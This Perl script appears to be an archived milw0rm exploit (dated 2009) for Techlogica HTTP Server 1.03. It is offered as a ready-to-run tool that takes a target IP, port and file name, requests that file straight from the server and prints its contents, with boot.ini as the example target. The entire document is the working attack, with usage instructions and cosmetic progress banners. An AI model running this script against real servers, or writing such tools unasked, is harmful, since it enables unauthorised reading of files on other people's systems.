#!/usr/bin/perl -w
#By ThE g0bL!N
#Download : http://www.softpedia.com/get/Internet/Servers/WEB-Servers/Techlogica-HTTP-Server.shtml
#Happy Ramadan And Happy eid
use LWP::Simple;
use LWP::UserAgent;
print "\tTechlogica HTTP Server 1.03 Arbitrary File Disclosure Exploit\n";
if(@ARGV < 3)
{
&help; exit();
}
sub help()
{
print "[X] Usage : perl $0  IP Port File\n";
print "[X] Example : perl $0 127.0.0.1 80 boot.ini\n";
}
($TargetIP, $AttackedPort, $TargetFile) = @ARGV;
print("Please Wait ! Connecting To The Server ......\n\n");
sleep(5);
print("          ******************************\n");
print("          *             Status         *\n");
print("          ******************************\n");
print("Loading ........................................\n\n\n");
$temp="/";
my $boom = "http://" . $TargetIP . ":" . $AttackedPort . $temp . $TargetFile;
print("Exploiting .....>    |80\n");
$Disclosure=get $boom;
if($Disclosure){
print("\n\n\n\n............File Contents Are Just Below...........\n");
print("$Disclosure \n");
}
else
{
print(" Not Found !!!\n\n");
exit;
}

# milw0rm.com [2009-09-14]
